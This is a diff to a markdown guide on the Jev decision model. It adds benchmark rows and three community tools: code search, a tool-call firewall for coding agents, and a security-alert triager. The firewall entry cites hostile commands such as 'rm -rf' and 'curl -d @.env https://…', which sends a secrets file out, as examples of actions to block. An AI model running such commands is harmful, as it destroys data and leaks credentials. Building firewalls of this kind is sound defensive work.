@@ -10,14 +10,14 @@ costs, and where the vendor claims don't hold up. Written to answer one question
 unreproduced. Anything tagged **(reported)** is a community self-report from launch week, not an
 independent benchmark. The [Reality check](#6-reality-check) section puts both side by side.
 
-Not affiliated with TypeSafe AI. Last updated: September 20, 2026.
+Not affiliated with TypeSafe AI. Last updated: September 21, 2026.
 
 ## Contents
 
 1. [What Jev is](#1-what-jev-is)
 2. [How it works — the three primitives](#2-how-it-works--the-three-primitives)
 3. [Five patterns worth stealing](#3-five-patterns-worth-stealing)
-4. [Use-case catalog](#4-use-case-catalog) — 17 use cases with code sketches
+4. [Use-case catalog](#4-use-case-catalog) — 20 use cases with code sketches
 5. [Cost math](#5-cost-math)
 6. [Reality check](#6-reality-check)
 7. [When NOT to use Jev](#7-when-not-to-use-jev)
@@ -141,7 +141,7 @@ compute exactly; avoid hiding several judgments inside one question.*
 
 ## 4. Use-case catalog
 
-Seventeen use cases, ordered roughly by how much real-world evidence exists. Every code sketch
+Twenty use cases, ordered roughly by how much real-world evidence exists. Every code sketch
 follows the SDK pattern from Section 2. The original twelve were added 2026-09-19 from
 launch-week coverage (sources published Sep 15–19, 2026); entries added later carry their own
 add date and source publish date.
@@ -161,6 +161,12 @@ confidence; below threshold goes to a human queue. This is the canonical System 
 email-fraud detector screening 100 emails in 1.42 s with uncertain cases passed on for
 further review (reported). TypeSafe's own eval included a customer-service workflow where
 Jev tied GPT-5.6 Terra on accuracy at ~1/76th the cost per case (vendor).
+
+**New signal — added 2026-09-21.** Bryo AI CTO Nikhil Mudholkar tested Jev against
+Gemini for classifying business emails: Gemini was slightly more accurate, Jev **10–20x
+cheaper** — and Jev was "the only one that hands back a real probability which makes it
+ideal for automating workflows" (reported via
+[TechCrunch, Sep 18, 2026](https://techcrunch.com/2026/09/18/a-new-kind-of-ai-model-from-a-chatgpt-inventor-is-thrilling-developers/)).
 
 **Sketch.**
 
@@ -558,6 +564,145 @@ slower, research-shaped loop.
 
 ---
 
+### 18. Semantic code navigation for coding agents
+
+**Added 2026-09-21.** Source published Sep 19, 2026 —
+[Bentlybro/siftr](https://github.com/Bentlybro/siftr).
+
+**The problem.** Coding agents burn context and money reading whole files to find the
+few lines that matter; keyword grep misses paraphrases and BM25 ranks poorly on code.
+
+**How Jev fits.** Every tool asks the same Jev question — *"is this relevant?"* — about
+many code chunks at once: hundreds of questions per request, all requests in parallel,
+in two passes. First rank every file from its name and definitions, then zoom into the
+best 30 files to point at exact lines. `search`, `read`, `pick`, and `filter` are all
+the same relevance question aimed at different granularities.
+
+**Real-world signal.** Measured on a frozen 202-issue SWE-bench Lite split the author
+never tuned on: `search` put the right file in the top 5 for **82%** of issues (BM25
+52%, grep 22%); `read` kept **92%** of the edited lines while cutting 59% of the file;
+`pick` found the right test file **81%** of the time (BM25 38%). Search takes ~2 s on a
+4,000-file repo (p90 2.9 s); read and pick land in under half a second; a large-repo
+search costs 1–2¢, read and pick well under a cent (all reported). Honest about losses
+too: `filter` lost to grep on keyword logs and is marked experimental.
+
+**Relationship to use case 14.** That section's semantic grep filters lines by meaning
+*inside* files; this is multi-tool repo navigation (search → read → pick) shipped as a
+CLI and MCP server for agents, with a published benchmark.
+
+**Sketch** — the two-pass pattern in `examples/code_search.py`:
+
+```python
+state = {"issue": issue_text, "chunks": candidate_chunks}
+questions = {f"c{i}": Noul("This code chunk is relevant to fixing the issue")
+             for i in range(len(candidate_chunks))}
+answers = client.system_one(state=state, questions=questions).answers
+ranked = sorted(chunks, key=lambda c: answers[c.id].noul, reverse=True)
+# Pass 1: rank files by name + definitions. Pass 2: zoom into the best 30,
+# asking the same question about exact line ranges.
+```
+
+---
+
+### 19. Tool-call firewall for coding agents
+
+**Added 2026-09-21.** Source published Sep 18, 2026 (last pushed Sep 20) —
+[RiskAverseTech/toolgate](https://github.com/RiskAverseTech/toolgate).
+
+**The problem.** Coding agents in auto mode run `rm -rf`, `curl -d @.env https://…`,
+and `git push --force` with no human in the loop — and a frontier-LLM safety
+classifier on every tool call is too slow and expensive to leave on.
+
+**How Jev fits.** One parallel Jev request per risky tool call: seven risk questions
+(**destructive**, **exfiltration**, **privilege**, **secret_exposure**, **off_task**,
+**violates_constraint**, **unresolved_choice**) plus an **authorized** mitigator —
+"does the stated task explicitly call for this action?" — that softens a verdict one
+step when the action was requested. Probabilities map to verdicts at fixed thresholds:
+max risk ≥ 0.85 denies, ≥ 0.55 asks, else allows. Static rules run first (~90 ms, zero
+model calls); read-only tools never cost a call.
+
+**Real-world signal.** Ships as a Claude Code `PreToolUse` hook and as an MCP proxy
+gating any MCP client (Cursor, Claude Desktop, custom agents); policy lives in one
+YAML file; every verdict is logged locally with its per-question probabilities.
+A real decision lands in about a second for a fraction of a cent (reported). Fail-safe
+defaults: unreachable model → ask, never a silent allow; secret-exposure and
+constraint-violation verdicts can never be softened away by the mitigator.
+
+**Relationship to use case 6.** That section covers the guardrail *pattern* (Vercel
+eve's default eval model, safety-check classifiers); this is a full open-source
+firewall product built on the pattern, with its question set, thresholds, and failure
+modes in the open.
+
+**Sketch** — the firewall pattern in `examples/tool_firewall.py`:
+
+```python
+answers = client.system_one(
+    state={"tool": tool_name, "input": tool_input[:20000], "task": task_context},
+    questions={
+        "destructive": Noul("Irreversibly destroys or overwrites data"),
+        "exfiltration": Noul("Sends local data to an outside destination"),
+        "privilege": Noul("Escalates privileges or edits system/security config"),
+        "secret_exposure": Noul("Prints, persists, or commits a credential value"),
+        "off_task": Noul("Outside the scope of the current task"),
+        "violates_constraint": Noul("Contradicts an explicit only/do-not in the task"),
+        "unresolved_choice": Noul("Makes a decision the task reserved for the human"),
+        "authorized": Noul("The stated task explicitly calls for this action"),
+    }).answers
+risks = {k: v.noul for k, v in answers.items() if k != "authorized"}
+worst = max(risks, key=risks.get)
+verdict = "deny" if risks[worst] >= 0.85 else "ask" if risks[worst] >= 0.55 else "allow"
+# Mitigator: requested actions soften one step — except secret_exposure,
+# violates_constraint, and unresolved_choice, which a task can never authorize away.
+```
+
+---
+
+### 20. Security-alert triage as a UNIX filter
+
+**Added 2026-09-21.** Source published Sep 18, 2026 —
+[m0rphtail/triagedy](https://github.com/m0rphtail/triagedy).
+
+**The problem.** SOC analysts drown in alert volume; the expensive triage tools — and
+the humans — should only see what survives a cheap first screen.
+
+**How Jev fits.** JSONL alerts in, typed decisions out: five questions per alert —
+disposition (`Choice`: close / escalate / contain / investigate), severity (`Score`
+0–3), false-positive (`Noul`), IR-escalation (`Noul`), attacker technique (`Choice`
+over MITRE-style categories). Policy routing stays in ordinary code: the model judges,
+your code decides. A local-model backend is supported for on-prem use, with the honest
+caveat that self-reported confidences there are uncalibrated.
+
+**Real-world signal.** Shipped as a single Rust binary — pipe it, host it, cron it —
+claiming ~200 ms per alert, cheap enough to screen *every* alert (reported; no
+published measurements on real alert volume yet).
+
+**Sketch:**
+
+```python
+answers = client.system_one(
+    state={"alert": alert_json},
+    questions={
+        "disposition": Choice("Correct triage disposition",
+            {"close": "Benign, close it", "escalate": "Needs a human analyst",
+             "contain": "Isolate the affected host", "investigate": "Needs deeper digging",
+             "other": "Does not fit"}),
+        "severity": Score("Severity if this is a true positive",
+            ["Negligible", "Low", "High", "Critical"]),
+        "false_positive": Noul("This alert is a false positive"),
+        "ir_escalation": Noul("Needs immediate incident-response escalation"),
+        "technique": Choice("Attacker technique category",
+            {"none": "No malicious technique", "execution": "…",
+             "credential_access": "…", "persistence": "…",
+             "lateral_movement": "…", "exfiltration": "…"}),
+    }).answers
+if answers["false_positive"].noul > 0.8:
+    close(alert)
+elif answers["ir_escalation"].noul > 0.7:
+    page_ir_team(alert, answers["severity"].score)
+```
+
+---
+
 ## 5. Cost math
 
 **Published pricing (vendor):** $0.042 per million input tokens ($42 per billion).
@@ -602,7 +747,7 @@ needed, decision models everywhere else.
 | Speed-up | 193.6x (homepage), 20–200x (launch) | **Median 7x** across 215 reported figures (quartiles 2x–20x) |
 | Cost reduction | 444.6x (homepage), 40–400x (launch) | **Median 30x** across 180 reported figures (quartiles 5x–85x) |
 | Latency | 70–500 ms end to end | **Median 76 ms** across 333 figures (quartiles 2–270 ms) |
-| Accuracy (4 workflows) | 67.8% agreement, ≈ Terra's 67.9% | No independent reproduction yet |
+| Accuracy (4 workflows) | 67.8% agreement, ≈ Terra's 67.9% | Third-party rows now exist — see below |
 | Structured-output errors | 0% by construction | Asserted, not measured ("schema matching is guaranteed, thus we can confidently add 0% into the plots" — vendor) |
 | "Cannot hallucinate" | Mathematically impossible | **Narrower than it sounds:** Jev cannot emit an *invalid* value. It can absolutely return a schema-valid answer that is factually *wrong*. |
 
@@ -610,6 +755,27 @@ Source for the community column: an analysis of 12,759 launch-week posts (Sep 15
 that separated authors' own measurements from repeated vendor figures. It's a survey of
 public reports, not an independent benchmark — but it's the best evidence available, and
 it says the gains are real and much smaller than the homepage multipliers.
+
+**Independent Jev benchmark rows — added 2026-09-21.** An independent open
+reproduction experiment ([edgelabs-ai/jev48](https://github.com/edgelabs-ai/jev48),
+published Sep 20, 2026) compiled Jev's scores on six public suites from independently
+published benchmark rows — not TypeSafe's own numbers (reported; mostly
+aggregate/unpaired comparisons against the experiment's own Jev48 clone):
+
+| Suite | Cases | Jev |
+|---|---|---:|
+| Typed decisions (LocalLLaMA) | 2,000 | 72.7% |
+| PhishNChips v5.2 | 2,000 | 62.6% |
+| JevBench public v1.2.2 | 231 | 86.6% |
+| BTZSC pilot | 300 | 75.3% |
+| Code review | 480 | 99.0% |
+| CLASH conflicts | 1,289 | 98.6% |
+
+The 72.7% typed-decisions figure is corroborated by a second independent open
+reproduction ([intikhab49/open-jev-typed-decision-engine](https://github.com/intikhab49/open-jev-typed-decision-engine),
+Sep 19, 2026: their clone scored 0.697 vs Jev's 0.727). Treat these as third-party
+measurements rather than vendor claims — and note every suite is
+decision/classification-shaped, which is exactly Jev's home turf.
 
 **Why the gap?** A speed-up means little until you know the baseline. Replacing a long
 reasoning call with a short classification call is a different comparison from replacing
@@ -693,8 +859,16 @@ Source of truth, roughly in order of usefulness:
   https://en.wikipedia.org/wiki/Jev_(AI_model)
 - Doomers — TypeSafe AI launch case study (adoption numbers) —
   https://doomers.ai/work/typesafe-ai-case-study
+- TechCrunch — "A new kind of AI model from a ChatGPT inventor is thrilling developers"
+  (Sep 18, 2026; Vercel and Bryo AI early-adopter reports) —
+  https://techcrunch.com/2026/09/18/a-new-kind-of-ai-model-from-a-chatgpt-inventor-is-thrilling-developers/
 
 Community builds referenced above (all launch-week, self-reported): `browser-use/jev-ultrafast`,
 `awlevin/typesafe-computer-use`, `jarrodwatts/jev-trader`, `RomanSlack/jev-drone`,
 `fhshaik/typesafe-mario`, `devagrawal09/jev-review`, `TheoLeeCJ/openjev`,
 `AbdelStark/awesome-typesafe`, `1kpapers.com`.
+
+Community builds added Sep 20–21, 2026 (self-reported): `RiskAverseTech/toolgate`
+(tool-call firewall), `Bentlybro/siftr` (semantic code search, SWE-bench Lite
+measurements), `m0rphtail/triagedy` (alert triage), `edgelabs-ai/jev48` (independent
+benchmark rows across six public suites).
